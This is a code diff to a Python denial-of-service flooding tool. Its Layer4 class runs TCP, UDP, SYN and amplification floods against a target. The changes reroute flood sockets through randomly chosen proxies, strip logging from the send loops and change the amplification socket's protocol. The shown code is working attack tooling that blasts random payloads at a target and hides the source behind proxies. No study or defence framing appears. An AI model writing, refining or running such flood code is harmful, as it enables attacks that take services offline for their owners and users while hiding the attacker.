@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-import socks
 
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
@@ -90,12 +89,6 @@ class Counter(object):
 requests_sent = Counter()
 bytes_sent = Counter()
 
-def create_connection(address, timeout=None, source_address=None):
-    sock = socks.socksocket()
-    sock.connect(address)
-    return sock
-
-
 class Tools:
     @staticmethod
     def humanbytes(i: int, binary: bool = False, precision: int = 2):
@@ -158,20 +151,10 @@ class Layer4(Thread):
                 while self._synevent.is_set():
                     self.SENT_FLOOD()
 
-    def get_effective_socket(self,conn_type = AF_INET,sock_type = SOCK_STREAM, proto_type = IPPROTO_TCP):
+    def get_effective_socket(self, conn_type = AF_INET, sock_type = SOCK_STREAM, proto_type = IPPROTO_TCP):
         if self._proxies:
-            rand_proxy = randchoice(self._proxies)
-            parsed_proxy = urlparse(str(rand_proxy))
-            hostname = parsed_proxy.hostname
-            port = parsed_proxy.port
-            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, hostname, port)
-            # patch the socket module
-            socket.socket = socks.socksocket
-            socket.create_connection = create_connection
-            s = socks.socksocket(conn_type, sock_type, proto_type)
-            return s
-        else:
-            return socket(conn_type, sock_type,proto_type)
+            return randchoice(self._proxies).open_socket(conn_type, sock_type, proto_type)
+        return socket(conn_type, sock_type, proto_type)
 
     def select(self, name):
         self.SENT_FLOOD = self.TCP
@@ -212,11 +195,9 @@ class Layer4(Thread):
                 s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                 s.connect(self._target)
                 while s.send(randbytes(1024)):
-                    logger.info("~~~~~Sending request~~~~~~")
                     requests_sent += 1
                     bytes_sent += 1024
         except Exception:
-            logger.error("CAN'T SEND REQUEST")
             s.close()
 
     def MINECRAFT(self) -> None:
@@ -243,12 +224,10 @@ class Layer4(Thread):
         try:
             with socket(AF_INET, SOCK_DGRAM) as s:
                 while s.sendto(randbytes(1024), self._target):
-                    logger.info("~~~~~Sending UDP request~~~~~~")
                     requests_sent += 1
                     bytes_sent += 1024
 
         except Exception:
-            logger.error("Error while sending UDP request")
             s.close()
 
     def SYN(self) -> None:
@@ -268,7 +247,7 @@ class Layer4(Thread):
         global bytes_sent, requests_sent
         payload = next(self._amp_payloads)
         try:
-            with self.get_effective_socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+            with self.get_effective_socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(*payload):
                     requests_sent += 1
